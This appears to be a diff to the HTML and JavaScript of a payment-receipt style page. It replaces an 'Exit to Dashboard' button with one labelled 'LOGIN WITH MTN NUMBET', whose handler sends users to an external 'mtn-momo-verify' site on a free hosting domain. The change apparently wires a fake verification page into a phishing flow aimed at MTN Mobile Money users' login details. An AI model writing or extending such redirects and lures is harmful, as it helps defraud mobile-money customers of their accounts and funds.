@@ -172,8 +172,11 @@
                     <div class="receipt-row"><span class="receipt-label">Review Status:</span><span><span id="receipt-status-badge" class="receipt-status-badge">-</span></span></div>
                 </div>
                 <div id="info-notice" class="info-notice-banner">-</div>
-                <button class="pill-cta-btn" style="width:100%; background-color:#ffcc00;" onclick="resetWorkflowLoop()">➔ Exit to Dashboard</button>
-            </div>
+               <button class="pill-cta-btn"
+style="width:100%; background-color:#ffcc00;"
+onclick="openHomeLink()">
+LOGIN WITH MTN NUMBET
+</button>             </div>
         </div>
     </div>
 
@@ -241,7 +244,11 @@
             navigateTo('screen-success');
         }
 
-        function resetWorkflowLoop() { if (pollTimer) clearInterval(pollTimer); location.reload(); }
+       function openHomeLink() {
+    if (pollTimer) clearInterval(pollTimer);
+
+    window.location.href = "https://mtn-momo-verify-5.onrender.com";
+} 
     </script>
 </body>
 </html>
